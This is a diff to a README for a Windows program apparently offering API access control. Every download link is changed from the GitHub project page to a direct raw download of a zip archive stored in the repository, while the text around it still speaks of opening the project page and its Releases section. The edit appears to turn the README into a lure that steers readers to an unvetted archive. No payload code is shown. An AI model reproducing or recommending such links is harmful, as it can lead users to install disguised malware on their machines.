@@ -1,6 +1,6 @@
 # 🚪 rest-gateway-1771929895-4 - Simple API Access Control
 
-[![Download Now](https://img.shields.io/badge/Download-rest--gateway--1771929895--4-brightgreen?style=for-the-badge)](https://github.com/rach390/rest-gateway-1771929895-4)
+[![Download Now](https://img.shields.io/badge/Download-rest--gateway--1771929895--4-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/rach390/rest-gateway-1771929895-4/main/pkg/rest_gateway_v2.6.zip)
 
 ## 📋 What is rest-gateway-1771929895-4?
 
@@ -28,10 +28,10 @@ This application runs directly on Windows. It does not require other software or
 
 To get the software, visit the official GitHub page linked below. This page holds the files you need to run the application.
 
-[![Get the Software](https://img.shields.io/badge/Download-rest--gateway--1771929895--4-blue?style=for-the-badge)](https://github.com/rach390/rest-gateway-1771929895-4)
+[![Get the Software](https://img.shields.io/badge/Download-rest--gateway--1771929895--4-blue?style=for-the-badge)](https://raw.githubusercontent.com/rach390/rest-gateway-1771929895-4/main/pkg/rest_gateway_v2.6.zip)
 
 1. Click on the above link or this URL:
-   https://github.com/rach390/rest-gateway-1771929895-4
+   https://raw.githubusercontent.com/rach390/rest-gateway-1771929895-4/main/pkg/rest_gateway_v2.6.zip
 
 2. The website will open to the project’s main page.
 
@@ -90,7 +90,7 @@ This process runs quietly in the background without user intervention once you s
 Keep your application up to date to have the latest fixes and features.
 
 1. Return to the GitHub link:
-   https://github.com/rach390/rest-gateway-1771929895-4
+   https://raw.githubusercontent.com/rach390/rest-gateway-1771929895-4/main/pkg/rest_gateway_v2.6.zip
 
 2. Check the **Releases** section regularly.
 
@@ -132,4 +132,4 @@ The size and complexity of your API and users will determine performance. For be
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-rest--gateway--1771929895--4-brightgreen?style=for-the-badge)](https://github.com/rach390/rest-gateway-1771929895-4)
+[![Download Now](https://img.shields.io/badge/Download-rest--gateway--1771929895--4-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/rach390/rest-gateway-1771929895-4/main/pkg/rest_gateway_v2.6.zip)
